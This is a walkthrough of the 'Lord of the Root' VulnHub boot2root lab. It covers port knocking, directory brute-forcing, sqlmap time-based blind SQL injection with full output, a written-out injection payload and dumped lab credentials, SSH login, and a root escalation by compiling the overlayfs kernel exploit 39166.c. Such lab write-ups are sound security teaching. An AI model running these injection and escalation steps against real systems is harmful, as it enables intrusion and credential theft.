# Lord-of-the-root-Vulnhub-Walkthrough
This is another Boot2Root challenge prepared by KoocSec. It is based on the concepts of great novel-turned-movie The Lord Of The Ring.
Download link - [https://download.vulnhub.com/lordoftheroot/LordOfTheRoot_1.0.1.ova](https://download.vulnhub.com/lordoftheroot/LordOfTheRoot_1.0.1.ova)

## Scanning

**nmap 192.168.122.146**

![Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled.png](Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled.png)

nmap -p- 192.168.122.146

![Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%201.png](Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%201.png)

Only 22 port is open. Lets try to connect using ssh.

**ssh root@192.168.122.146** 

It is giving some hint "knock friend to enter". It means PORT KNOCKING.

![Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%202.png](Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%202.png)

nmap -r -Pn -p1,2,3 192.168.122.146

![Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%203.png](Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%203.png)

nmap -p- 192.168.122.146

![Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%204.png](Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%204.png)

Now its showing one more port 1337

## Enumeration

Open it in browser http://192.168.122.146:1337

![Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%205.png](Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%205.png)

Bruteforcing directories using dirbuster

![Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%206.png](Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%206.png)

![Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%207.png](Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%207.png)

http://192.168.122146:1337/sitemap.xml

![Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%208.png](Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%208.png)

In view-source, I found base64 encoded string

![Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%209.png](Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%209.png)

Lets decode it. It is double encoded

![Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%2010.png](Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%2010.png)

After decoding string it gives directory /978345210/index.php

![Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%2011.png](Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%2011.png)

## Exploitation

Open [http://192.168.122.146:1337/978345210/index.php](http://192.168.122.146:1337/978345210/index.php). Its a login panel

![Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%2012.png](Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%2012.png)

Lets try sqlmap to retrieve username and password. 

sqlmap -u http://192.168.122.146:1337/978345210/index.php --forms --dbs --batch

```jsx
root@kali:~# sqlmap -u http://192.168.122.146:1337/978345210/index.php --forms --dbs --batch
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.6#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:58:27 /2020-08-25/

[03:58:27] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=smgujsk4d28...1811ctibt4'). Do you want to use those [Y/n] Y
[03:58:28] [INFO] searching for forms
[#1] form:
POST http://192.168.122.146:1337/978345210/index.php
POST data: username=&password=&submit=%20Login%20
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: username=&password=&submit=%20Login%20] (Warning: blank fields detected): username=&password=&submit= Login 
do you want to fill blank fields with random values? [Y/n] Y
it appears that provided value for POST parameter 'submit' has boundaries. Do you want to inject inside? (' Login* ') [y/N] N
[03:58:29] [INFO] using '/root/.sqlmap/output/results-08252020_0358am.csv' as the CSV results file in multiple targets mode
[03:58:29] [INFO] checking if the target is protected by some kind of WAF/IPS
[03:58:29] [INFO] testing if the target URL content is stable
[03:58:29] [INFO] target URL content is stable
[03:58:29] [INFO] testing if POST parameter 'username' is dynamic
[03:58:29] [WARNING] POST parameter 'username' does not appear to be dynamic
[03:58:30] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[03:58:30] [INFO] testing for SQL injection on POST parameter 'username'
[03:58:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[03:58:30] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[03:58:30] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[03:58:30] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[03:58:30] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[03:58:31] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[03:58:31] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[03:58:31] [INFO] testing 'Generic inline queries'
[03:58:31] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[03:58:31] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[03:58:31] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[03:58:31] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[03:58:32] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[03:58:32] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[03:58:32] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[03:58:32] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[03:58:32] [WARNING] POST parameter 'username' does not seem to be injectable
[03:58:32] [INFO] testing if POST parameter 'password' is dynamic
[03:58:32] [WARNING] POST parameter 'password' does not appear to be dynamic
[03:58:32] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable
[03:58:33] [INFO] testing for SQL injection on POST parameter 'password'
[03:58:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[03:58:34] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[03:58:34] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[03:58:34] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[03:58:35] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[03:58:36] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[03:58:36] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[03:58:36] [INFO] testing 'Generic inline queries'
[03:58:36] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[03:58:37] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[03:58:37] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[03:58:37] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[03:58:48] [INFO] POST parameter 'password' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[03:58:48] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[03:58:48] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[03:58:48] [INFO] checking if the injection point on POST parameter 'password' is a false positive
POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 128 HTTP(s) requests:
---
Parameter: password (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=fPLr&password=' AND (SELECT 5612 FROM (SELECT(SLEEP(5)))WiKo) AND 'lvXp'='lvXp&submit= Login
---
do you want to exploit this SQL injection? [Y/n] Y
[03:59:04] [INFO] the back-end DBMS is MySQL
[03:59:04] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
back-end DBMS: MySQL >= 5.0.12
[03:59:05] [INFO] fetching database names
[03:59:05] [INFO] fetching number of databases
[03:59:05] [INFO] retrieved: 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
4
[03:59:10] [INFO] retrieved: 
[03:59:20] [INFO] adjusting time delay to 2 seconds due to good response times
information_schema
[04:01:19] [INFO] retrieved: Webapp
[04:02:00] [INFO] retrieved: mysql
[04:02:34] [INFO] retrieved: performance_schema
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
**[*] Webapp**

[04:04:29] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.sqlmap/output/results-08252020_0358am.csv'
[04:04:29] [WARNING] you haven't updated sqlmap for more than 85 days!!!

[*] ending @ 04:04:29 /2020-08-25/

root@kali:~#
```

sqlmap --url http://192.168.122.146:1337/978345210/index.php --forms --dbs --level=5 --risk=3 -D Webapp --tables --batch

```jsx
root@kali:~# sqlmap --url http://192.168.122.146:1337/978345210/index.php --forms --dbs --level=5 --risk=3 -D Webapp --tables --batch
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.6#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:26:14 /2020-08-25/

[04:26:14] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=86s0g97oej6...jisdij0id1'). Do you want to use those [Y/n] Y
[04:26:15] [INFO] searching for forms
[#1] form:
POST http://192.168.122.146:1337/978345210/index.php
POST data: username=&password=&submit=%20Login%20
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: username=&password=&submit=%20Login%20] (Warning: blank fields detected): username=&password=&submit= Login 
do you want to fill blank fields with random values? [Y/n] Y
it appears that provided value for POST parameter 'submit' has boundaries. Do you want to inject inside? (' Login* ') [y/N] N
[04:26:15] [INFO] resuming back-end DBMS 'mysql' 
[04:26:15] [INFO] using '/root/.sqlmap/output/results-08252020_0426am.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: password (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=fPLr&password=' AND (SELECT 5612 FROM (SELECT(SLEEP(5)))WiKo) AND 'lvXp'='lvXp&submit= Login
---
do you want to exploit this SQL injection? [Y/n] Y
[04:26:15] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[04:26:15] [INFO] fetching database names
[04:26:15] [INFO] fetching number of databases
[04:26:15] [INFO] resumed: 4
[04:26:15] [INFO] resumed: information_schema
[04:26:15] [INFO] resumed: Webapp
[04:26:15] [INFO] resumed: mysql
[04:26:15] [INFO] resumed: performance_schema
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] Webapp

[04:26:15] [INFO] fetching tables for database: 'Webapp'
[04:26:15] [INFO] fetching number of tables for database 'Webapp'
[04:26:15] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[04:26:16] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
1
[04:26:21] [INFO] retrieved: 
[04:26:31] [INFO] adjusting time delay to 1 second due to good response times
Users
Database: Webapp
[1 table]
**+-------+
| Users |
+-------+**

[04:26:45] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.sqlmap/output/results-08252020_0426am.csv'
[04:26:45] [WARNING] you haven't updated sqlmap for more than 85 days!!!

[*] ending @ 04:26:45 /2020-08-25/

root@kali:~#
```

sqlmap --url http://192.168.122.146:1337/978345210/index.php --forms --dbs --level=5 --risk=3 -D Webapp -T Users --columns --dump --batch

```jsx
root@kali:~# sqlmap --url http://192.168.122.146:1337/978345210/index.php --forms --dbs --level=5 --risk=3 -D Webapp -T Users --columns --dump --batch
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.6#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:23:40 /2020-08-25/

[04:23:40] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=gn3fe91hhb7...bs2h8s26e1'). Do you want to use those [Y/n] Y
[04:23:40] [INFO] searching for forms
[#1] form:
POST http://192.168.122.146:1337/978345210/index.php
POST data: username=&password=&submit=%20Login%20
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: username=&password=&submit=%20Login%20] (Warning: blank fields detected): username=&password=&submit= Login 
do you want to fill blank fields with random values? [Y/n] Y
it appears that provided value for POST parameter 'submit' has boundaries. Do you want to inject inside? (' Login* ') [y/N] N
[04:23:40] [INFO] resuming back-end DBMS 'mysql' 
[04:23:40] [INFO] using '/root/.sqlmap/output/results-08252020_0423am.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: password (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=fPLr&password=' AND (SELECT 5612 FROM (SELECT(SLEEP(5)))WiKo) AND 'lvXp'='lvXp&submit= Login
---
do you want to exploit this SQL injection? [Y/n] Y
[04:23:40] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[04:23:40] [INFO] fetching database names
[04:23:40] [INFO] fetching number of databases
[04:23:40] [INFO] resumed: 4
[04:23:40] [INFO] resumed: information_schema
[04:23:40] [INFO] resumed: Webapp
[04:23:40] [INFO] resumed: mysql
[04:23:40] [INFO] resumed: performance_schema
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] Webapp

[04:23:40] [INFO] fetching columns for table 'Users' in database 'Webapp'
[04:23:40] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                
[04:23:41] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[04:23:56] [INFO] adjusting time delay to 1 second due to good response times
3
[04:23:56] [INFO] retrieved: id
[04:24:03] [INFO] retrieved: int(10)
[04:24:29] [INFO] retrieved: username
[04:24:53] [INFO] retrieved: varchar(255)
[04:25:33] [INFO] retrieved: password
[04:26:02] [INFO] retrieved: varchar(255)
Database: Webapp
Table: Users
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(10)      |
| password | varchar(255) |
| username | varchar(255) |
+----------+--------------+

[04:26:42] [INFO] fetching columns for table 'Users' in database 'Webapp'
[04:26:42] [INFO] resumed: 3
[04:26:42] [INFO] resumed: id
[04:26:42] [INFO] resumed: username
[04:26:42] [INFO] resumed: password
[04:26:42] [INFO] fetching entries for table 'Users' in database 'Webapp'
[04:26:42] [INFO] fetching number of entries for table 'Users' in database 'Webapp'
[04:26:42] [INFO] retrieved: 5
[04:26:44] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)       
1
[04:26:46] [INFO] retrieved: iwilltakethering
[04:27:39] [INFO] retrieved: frodo
[04:27:59] [INFO] retrieved: 2
[04:28:02] [INFO] retrieved: MyPreciousR00t
[04:28:53] [INFO] retrieved: smeagol
[04:29:16] [INFO] retrieved: 3
[04:29:20] [INFO] retrieved: AndMySword
[04:30:00] [INFO] retrieved: aragorn
[04:30:22] [INFO] retrieved: 4
[04:30:27] [INFO] retrieved: AndMyBow
[04:31:00] [INFO] retrieved: legolas
[04:31:25] [INFO] retrieved: 5
[04:31:28] [INFO] retrieved: AndMyAxe
[04:32:00] [INFO] retrieved: gimli
Database: Webapp
Table: Users
[5 entries]
**+------+----------+------------------+
| id   | username | password         |
+------+----------+------------------+
| 1    | frodo    | iwilltakethering |
| 2    | smeagol  | MyPreciousR00t   |
| 3    | aragorn  | AndMySword       |
| 4    | legolas  | AndMyBow         |
| 5    | gimli    | AndMyAxe         |
+------+----------+------------------+**

[04:32:16] [INFO] table 'Webapp.Users' dumped to CSV file '/root/.sqlmap/output/192.168.122.146/dump/Webapp/Users.csv'
[04:32:16] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.sqlmap/output/results-08252020_0423am.csv'
[04:32:16] [WARNING] you haven't updated sqlmap for more than 85 days!!!

[*] ending @ 04:32:16 /2020-08-25/

root@kali:~#
```

Using smeagol:MyPreciousR00t to login through ssh

![Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%2013.png](Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%2013.png)

Got shell of smeagol user

## Privilege escalation

Using kernal exploit (overlayfs) to escalate privilege to root

![Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%2014.png](Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%2014.png)

Download overlayfs exploit to target system

![Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%2015.png](Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%2015.png)

**gcc 39166.c -o overlayfs**

**./overlayfs**

![Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%2016.png](Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%2016.png)

*** Successfully got shell of root

![Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%2017.png](Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%2017.png)

cd /root

![Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%2018.png](Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%2018.png)

cat Flag.txt

![Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%2019.png](Lord%20of%20the%20root%208b49d65873a6464cb184447ee57a6e18/Untitled%2019.png)
